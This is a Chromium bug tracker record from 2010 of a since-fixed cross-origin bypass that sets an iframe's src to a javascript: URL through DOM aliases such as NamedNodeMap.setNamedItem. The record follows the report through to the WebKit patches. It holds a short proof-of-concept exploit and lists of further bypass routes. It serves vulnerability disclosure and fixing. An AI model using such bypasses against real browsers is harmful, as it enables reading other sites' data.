# Cross-origin bypass: Javascript URL can be set in iframe.src via numerous DOM aliases (via Node and NamedNodeMap)

| Field | Value |
|-------|-------|
| **Issue ID** | [40080149](https://issues.chromium.org/issues/40080149) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | js...@chromium.org |
| **Assignee** | js...@chromium.org |
| **Created** | 2010-03-31 |
| **Bounty** | $1,000.00 |

## Description

Originally submitted by serg.glazunov

Unfortunately, there's another way to bypass the check.
JavaScript:
i = document.createElement('iframe');
i.src = 'http://google.com/';
attr = document.createAttribute('src');
attr.nodeValue = 'javascript:alert(document.body.innerHTML)';
i.onload = function ()
{
	i.onload = null;
	i.attributes.setNamedItem(attr);
}
document.body.appendChild(i);

Tested on r43185.


## Attachments

- [cross-origin2.html](attachments/cross-origin2.html) (text/html, 388 B)

## Timeline

### js...@chromium.org (2010-03-31)

I branched this off from https://crbug.com/chromium/39047. I haven't had a chance to confirm against a 
trunk build, but I looked at NamedNodeMap::setNamedItem(), and I don't see anything 
preventing the attack.

I'll take this one and then spend a few days going through the WebKit DOM interfaces 
to see what else is hiding, or if there's a better solution than the current whack-a-
mole strategy.


### sk...@chromium.org (2010-03-31)

Confirmed in 5.0.362.0 (42462)
http://tinyurl.com/y994hjc
(link redirects to http://jssh.skypher.com/4.4/Main.html and executes the javascript)

### [Deleted User] (2010-04-01)

[Empty comment from Monorail migration]

### js...@chromium.org (2010-04-01)

[Empty comment from Monorail migration]

### js...@chromium.org (2010-04-02)

I've spent a day or two digging into the bindings and this is uglier than it first 
appeared. So far all the following bypasses work in Chrome and Safari:

- Node.attributes['src'].setNamedItem()
- Node.attributes['src'].setNamedItemNS()
- Node.attributes['src'].childNodes[0].[textContent|nodeValue]
- Node.attributes['src'].firstChild.[textContent|nodeValue]
- Node.attributes['src'].lastChild.[textContent|nodeValue]
- Node.attributes['src'].replaceChild()
- Node.attributes['src'].insertBefore()

I already have a fix for NamedNodeMap, which is it's own special case. I'll probably 
also end up reverting the changes I made to the Attr binding, and instead pushing the 
checks up to the Node binding where I can just special-case Attr types. However, I 
want to spend a little extra time to ensure I have a complete solution, so it may 
take a bit longer than I originally estimated.


### js...@chromium.org (2010-04-02)

Reported upstream at: https://bugs.webkit.org/show_bug.cgi?id=37031

### js...@chromium.org (2010-04-13)

Just a status update. I have a patch under review for the interim binding fix, and 
we're discussing the significantly bigger long-term fix of moving origin checking into 
the DOM.

### js...@chromium.org (2010-04-15)

Interim patches landed on WebKit here:

http://trac.webkit.org/changeset/57627
http://trac.webkit.org/changeset/57658

Since the V8 binding generators and naming conventions changed completely after v4 I 
need to spend a few hours manually patching stable.


### se...@gmail.com (2010-04-16)

Does the "Node.attributes['src'].childNodes[0].nodeValue" bypass have to be fixed by 
this patch? It still works on 5.0.370.0 (43826).
Besides, there are a couple of new ones:
Node.attributes['src'].childNodes[0].replaceWholeText()
Node.attributes['src'].childNodes[0].data
.deleteData()
.insertData()
.replaceData()
.substringData()

### js...@chromium.org (2010-04-16)

The patches above landed on our source tree yesterday, so they aren't in any available 
Chrome releases. And, as I explained above, these are just interim patches to catch the 
cases we've identified (which extend well beyond your original report). Meanwhile, we're 
working on rchitectural changes to WebKit that move these security checks to the lowest 
possible layer, which should prevent any variants of this in the future. However, neither 
Google nor Chromium development team controls WebKit, so we must get approval and 
coordinate these kinds of major changes through the WebKit project leads. That process 
adds additional time to what's required to implement the change (which is a significant 
amount of work on its own).


### js...@chromium.org (2010-04-28)

Just a status update here. I have the big DOM security patch working with v8 and 
passing layout tests. The JSC integration is significantly trickier, but I still think 
I'll have the time to finish it off this week. 


### sc...@gmail.com (2010-05-03)

We talked about this a while ago and decided this second manifestation was worth 
another reward. I forgot to mention it and add the label at this time, but anyway - 
congrats :D

### js...@chromium.org (2010-05-18)

Landed upstream at: http://trac.webkit.org/changeset/59693
Hopefully this one will stick.


### js...@chromium.org (2010-05-19)

The last one didn't stick due to a GTK layout test failure in:
fast/dom/Geolocation/enabled.html

The failure seems unrelated and the patch relanded as: 
http://trac.webkit.org/changeset/59769

Hopefully the third time is the charm.


### js...@chromium.org (2010-05-23)

Forgot to update. This landed (and stuck) here: http://trac.webkit.org/changeset/59866

The failed landings were because the patch kept tickling https://crbug.com/chromium/44868. I'll merge to 375 
on Friday so it makes the cut for the post v5 security release.


### js...@chromium.org (2010-05-24)

[Empty comment from Monorail migration]

### bu...@gmail.com (2010-05-25)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=48159 

------------------------------------------------------------------------
r48159 | jschuh@chromium.org | 2010-05-25 09:58:32 -0700 (Tue, 25 May 2010) | 125 lines
Changed paths:
   M http://src.chromium.org/viewvc/chrome/branches/WebKit/375/WebCore/bindings/v8/ScriptController.cpp?r1=48159&r2=48158
   M http://src.chromium.org/viewvc/chrome/branches/WebKit/375/WebCore/bindings/v8/ScriptController.h?r1=48159&r2=48158
   M http://src.chromium.org/viewvc/chrome/branches/WebKit/375/WebCore/html/HTMLFrameElementBase.cpp?r1=48159&r2=48158

Merge 59866 - 20100520  Justin Schuh  <jschuh@chromium.org>

        Reviewed by Adam Barth.

        Moving frame.src checks out of the bindings
        https://bugs.webkit.org/show_bug.cgi?id=37815

        Moved JavaScript frame.src checks out of bindings and into
        HTMLFrameElementBase. Added main thread state stack to JavaScriptCore
        so ExecState is available inside core DOM. Updated affected bindings
        (except for GObject, which will need to be updated to avoid origin
        failures inside native code).

        * Android.jscbindings.mk:
        * CMakeLists.txt:
        * GNUmakefile.am:
        * WebCore.gypi:
        * WebCore.pro:
        * WebCore.vcproj/WebCore.vcproj:
        * WebCore.xcodeproj/project.pbxproj:
        * bindings/js/JSBindingsAllInOne.cpp:
        * bindings/js/JSCallbackData.cpp:
        (WebCore::JSCallbackData::invokeCallback):
        * bindings/js/JSEventListener.cpp:
        (WebCore::JSEventListener::handleEvent):
        * bindings/js/JSInjectedScriptHostCustom.cpp:
        (WebCore::InjectedScriptHost::createInjectedScript):
        * bindings/js/JSMainThreadExecState.cpp: Added.
        * bindings/js/JSMainThreadExecState.h: Added.
        (WebCore::JSMainThreadExecState::currentState):
        (WebCore::JSMainThreadExecState::call):
        (WebCore::JSMainThreadExecState::evaluate):
        (WebCore::JSMainThreadExecState::JSMainThreadExecState):
        (WebCore::JSMainThreadExecState::~JSMainThreadExecState):
        (WebCore::JSMainThreadNullState::JSMainThreadNullState):
        * bindings/js/ScheduledAction.cpp:
        (WebCore::ScheduledAction::executeFunctionInContext):
        (WebCore::ScheduledAction::execute):
        * bindings/js/ScheduledAction.h:
        * bindings/js/ScriptController.cpp:
        (WebCore::ScriptController::evaluateInWorld):
        (WebCore::ScriptController::canAccessFromCurrentOrigin):
        * bindings/js/ScriptController.h:
        * bindings/js/ScriptFunctionCall.cpp:
        (WebCore::ScriptFunctionCall::call):
        * bindings/objc/ObjCEventListener.mm:
        * bindings/objc/WebScriptObject.mm:
        ([WebScriptObject callWebScriptMethod:withArguments:]):
        ([WebScriptObject evaluateWebScript:]):
        * bindings/scripts/CodeGeneratorObjC.pm:
        * bindings/scripts/test/ObjC/DOMTestCallback.mm:
        ([DOMTestCallback callbackWithClass1Param:]):
        ([DOMTestCallback callbackWithClass2Param:strArg:]):
        ([DOMTestCallback callbackWithNonBoolReturnType:]):
        ([DOMTestCallback customCallback:class6Param:]):
        * bindings/scripts/test/ObjC/DOMTestInterface.mm:
        * bindings/scripts/test/ObjC/DOMTestObj.mm:
        ([DOMTestObj readOnlyIntAttr]):
        ([DOMTestObj readOnlyStringAttr]):
        ([DOMTestObj readOnlyTestObjAttr]):
        ([DOMTestObj intAttr]):
        ([DOMTestObj setIntAttr:]):
        ([DOMTestObj longLongAttr]):
        ([DOMTestObj setLongLongAttr:]):
        ([DOMTestObj unsignedLongLongAttr]):
        ([DOMTestObj setUnsignedLongLongAttr:]):
        ([DOMTestObj stringAttr]):
        ([DOMTestObj setStringAttr:]):
        ([DOMTestObj testObjAttr]):
        ([DOMTestObj setTestObjAttr:]):
        ([DOMTestObj attrWithException]):
        ([DOMTestObj setAttrWithException:]):
        ([DOMTestObj attrWithSetterException]):
        ([DOMTestObj setAttrWithSetterException:]):
        ([DOMTestObj attrWithGetterException]):
        ([DOMTestObj setAttrWithGetterException:]):
        ([DOMTestObj customAttr]):
        ([DOMTestObj setCustomAttr:]):
        ([DOMTestObj scriptStringAttr]):
        ([DOMTestObj voidMethod]):
        ([DOMTestObj voidMethodWithArgs:strArg:objArg:]):
        ([DOMTestObj intMethod]):
        ([DOMTestObj intMethodWithArgs:strArg:objArg:]):
        ([DOMTestObj objMethod]):
        ([DOMTestObj objMethodWithArgs:strArg:objArg:]):
        ([DOMTestObj methodThatRequiresAllArgs:objArg:]):
        ([DOMTestObj methodThatRequiresAllArgsAndThrows:objArg:]):
        ([DOMTestObj serializedValue:]):
        ([DOMTestObj methodWithException]):
        ([DOMTestObj customMethod]):
        ([DOMTestObj customMethodWithArgs:strArg:objArg:]):
        ([DOMTestObj customArgsAndException:]):
        ([DOMTestObj addEventListener:listener:useCapture:]):
        ([DOMTestObj removeEventListener:listener:useCapture:]):
        ([DOMTestObj withDynamicFrame]):
        ([DOMTestObj withDynamicFrameAndArg:]):
        ([DOMTestObj withDynamicFrameAndOptionalArg:optionalArg:]):
        ([DOMTestObj withDynamicFrameAndUserGesture:]):
        ([DOMTestObj withDynamicFrameAndUserGestureASAD:optionalArg:]):
        ([DOMTestObj withScriptStateVoid]):
        ([DOMTestObj withScriptStateObj]):
        ([DOMTestObj withScriptStateVoidException]):
        ([DOMTestObj withScriptStateObjException]):
        ([DOMTestObj methodWithOptionalArg:]):
        ([DOMTestObj methodWithNonOptionalArgAndOptionalArg:opt:]):
        ([DOMTestObj methodWithNonOptionalArgAndTwoOptionalArgs:opt1:opt2:]):
        * bindings/v8/ScriptController.cpp:
        (WebCore::ScriptController::canAccessFromCurrentOrigin):
        * bindings/v8/ScriptController.h:
        * html/HTMLFrameElementBase.cpp:
        (WebCore::HTMLFrameElementBase::isURLAllowed):
20100520  Justin Schuh  <jschuh@chromium.org>

        Reviewed by Adam Barth.

        Moving frame.src checks out of the bindings
        https://bugs.webkit.org/show_bug.cgi?id=37815

        * http/tests/security/xssDENIEDiframesrcaliasexpected.txt:
        * http/tests/security/xssDENIEDiframesrcalias.html:


TBR=jschuh@chromium.org
BUG=39985
Review URL: http://codereview.chromium.org/2159006
------------------------------------------------------------------------


### js...@chromium.org (2010-05-25)

[Empty comment from Monorail migration]

### sc...@gmail.com (2010-06-11)

Fixed in 5.0.375.70

### js...@chromium.org (2010-06-11)

Waiting for Safari to pull this in before we release.

### js...@chromium.org (2010-06-22)

[Empty comment from Monorail migration]

### js...@chromium.org (2010-12-16)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/39985?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40080149)*
